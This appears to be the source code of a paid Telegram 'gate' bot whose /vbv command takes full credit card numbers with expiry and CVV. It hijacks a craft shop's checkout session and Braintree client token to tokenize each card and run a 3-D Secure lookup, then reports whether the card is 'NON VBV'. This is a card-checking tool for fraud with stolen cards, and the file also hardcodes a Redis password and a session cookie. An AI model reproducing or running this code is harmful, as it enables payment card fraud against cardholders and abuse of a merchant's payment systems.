import time
from pyrogram import Client
import requests
from requests.api import request
from requests.exceptions import ProxyError
import re
import bs4
from defs import *
from pyrogram import Client, filters
import json
import base64
@Client.on_message(filters.command("vbv", prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def ci(Client, message):
    try:
        started_time = time.time()
        verified_gps = open("groups.txt", "r")
        verified_gps = verified_gps.readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text="""<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Ask For Verification.</b>""",reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>BRAINTREE VBV LOOKUP</b>
<b>○</b> RESULT: <b>CHECKING YOUR INPUT</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
            find = client.bot["main"].find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(f"""<b>Register Yourself To Use Me. Hit /takeme To Register Yourself</b>""")
            elif find['status'] == "F" and message.chat.type == 'private':
                await msg.edit_text("""<b>Take Paid Plan To Use ME Here User hit /buy to see my premium plans</b>""")
            else:
                r = redis.Redis(
                    host="redis-18001.c82.us-east-1-2.ec2.cloud.redislabs.com",
                    port=18001,
                    password="eO00qpZScxQ6u1UsZ32Y94YuZ1J7pGWR",
                )
                antispam_time = int(r.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 10:
                    time_left = 10 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                elif role == "F" and spam_time < 60:
                    time_left =  60 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError("Your Card Is Empty")
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect Or Empty")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                        cc_first_letter = int(cc[0])
                        len_mes = len(mes)
                        if cc_first_letter in [1,2,7,8,9,0]:
                            await msg.edit_text("Your Card Invalid")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short")
                        elif int(len(mes)) not in [2,4] or len_mes == 2 and mes > '12' or len_mes == 2 and mes < '00' or len_mes != 2:
                            await msg.edit_text("Your Card Month Is Incorrect")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2 or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect")
                        elif cc_first_letter == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card's Bin Is Invalid")   
                            elif(str(message.chat.id) + "\n"in open("bannedbin.txt", "r").readlines()):
                                await msg.edit_text("Your Card's Bin Is Banned")
                            else:
                                bin_data = json.loads(res.text)
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
                                first_name = random_data['results'][0]['name']['first']
                                last_name = random_data['results'][0]['name']['last']
                                street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
                                city = random_data['results'][0]['location']['city']
                                state = random_data['results'][0]['location']['state']
                                zip = random_data['results'][0]['location']['postcode']
                                vendor = bin_data["data"]["vendor"].lower()
                                email = get_email()
                                password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                headers = {
                                'accept':'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'cookie':'sessionid=mlgzbdcrydieukv7nkntkm4ljirjqvwi',
                                'origin':'https://buddlycrafts.com',
                                'referer': 'https://buddlycrafts.com/checkout/step3/CB211021IVXY/',
                                'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
                                }
                                step1 = requests.get('https://buddlycrafts.com/checkout/step4/CB211021IVXY/',headers=headers)
                                token1 = re.search(r'client_token": "(.*)", "m', step1.text)
                                print(step1.text)
                                if isinstance(token1, type(None)) == True:
                                    text = f"""
<b>〄</b> GATE: <b>BRAINTREE VBV LOOKUP</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                else:
                                    auth = token1.group(1)
                                    print(auth)
                                    base64_bytes = auth.encode('ascii')
                                    message_bytes = base64.b64decode(base64_bytes)
                                    message = message_bytes.decode('ascii')
                                    main_bearer = re.search(r'"authorizationFingerprint":"(.*)","configUrl', message).group(1)
                                    merchant_id = re.search(r'"merchant_id": "(.*)", "vault', step1.text).group(1)
                                    text = f"""
<b>〄</b> GATE: <b>BRAINTREE VBV LOOKUP</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: ■■■■■□□□□□ 50%
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    bearer = f'Bearer {main_bearer}'
                                    headers = {
                                    'Accept':'*/*',
                                    'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                    'Authorization': bearer,
                                    'Braintree-Version':'2018-05-10',
                                    'Content-Type':'application/json',
                                    'Host':'payments.braintree-api.com',
                                    'Origin':'https://assets.braintreegateway.com',
                                    'Referer':'https://assets.braintreegateway.com/',
                                    'sec-ch-ua-mobile':'?0',
                                    'sec-ch-ua-platform':'"Linux"',
                                    'Sec-Fetch-Dest':'empty',
                                    'Sec-Fetch-Mode':'cors',
                                    'Sec-Fetch-Site':'cross-site',
                                    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
                                    }
                                    data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"4b8fc5b9-12b6-4855-b2c4-f31ee3837785"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' +  cc +'","expirationMonth":"' + mes +'","expirationYear":"' + ano +'","cvv":"' + cvv +'","cardholderName":"Carolyn watson"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
                                    step1 = requests.post("https://payments.braintree-api.com/graphql",headers=headers,data=data)
                                    json_load = json.loads(step1.text)
                                    tokencc = json_load['data']['tokenizeCreditCard']['token']
                                    url = f'https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
                                    headers = {
                                    'Accept':'*/*',
                                    'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                    'Content-Type':'application/json',
                                    'Host':'api.braintreegateway.com',
                                    'Origin':'https://buddlycrafts.com',
                                    'Referer':'https://buddlycrafts.com/',
                                    'sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                                    'sec-ch-ua-mobile':'?0',
                                    'sec-ch-ua-platform':'"Linux"',
                                    'Sec-Fetch-Dest':'empty',
                                    'Sec-Fetch-Mode':'cors',
                                    'Sec-Fetch-Site':'cross-site',
                                    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
                                    }
                                    data = '{"amount":"11.47","additionalInfo":{"shippingGivenName":"Carolyn","shippingSurname":"watson","shippingPhone":"2259773937","billingLine1":"999 Main Street","billingLine2":"","billingCity":"New York","billingState":"NY","billingPostalCode":"10002","billingCountryCode":"US","billingPhoneNumber":"2259773937","billingGivenName":"Carolyn","billingSurname":"watson","shippingLine1":"999 Main Street","shippingLine2":"","shippingCity":"New York","shippingState":"NY","shippingPostalCode":"10002","shippingCountryCode":"US","email":"godofheroku@gmail.com"},"bin":"426606","dfReferenceId":"0_9e4bae0f-d3ae-4806-8430-bdb6cc635e99","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.68.0","cardinalDeviceDataCollectionTimeElapsed":4656,"issuerDeviceDataCollectionTimeElapsed":8368,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"' + main_bearer + '","braintreeLibraryVersion":"braintree/web/3.68.0","_meta":{"merchantAppId":"buddlycrafts.com","platform":"web","sdkVersion":"3.68.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"4b8fc5b9-12b6-4855-b2c4-f31ee3837785"}}'
                                    step1 = requests.post(url,headers=headers,data=data)
                                    response = step1.json()
                                    res = response['paymentMethod']['threeDSecureInfo']
                                    req = res['enrolled']
                                    text = f"""
    <b>〄</b> GATE: <b>BRAINTREE VBV LOOKUP</b>
    <b>○</b> INPUT: <code>{lista}</code>
    <b>○</b> RESULT: <b>ALMOST COMPLETED</b>
    <b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
    <b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
    <b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
    <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
    <b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
    <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if req == 'Y':
                                            response = "VBV"
                                            r_logo = "❌"
                                            r_text = "LOOKUP ENROLLED"
                                        elif req == 'N':
                                            response = "NON VBV"
                                            r_logo = "✅"
                                            r_text = "LOOKUP NOT ENROLLED"
                                        else:
                                            response = "ERROR"
                                            r_logo = "❗"
                                            r_text = "ERROR"
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            text = f"""
    <b>〄</b> GATE: <b>BRAINTREE VBV LOOKUP</b>
    <b>○</b> INPUT: <code>{lista}</code>
    <b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
    <b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
    <b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
    <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
    <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
    <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In Ci Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
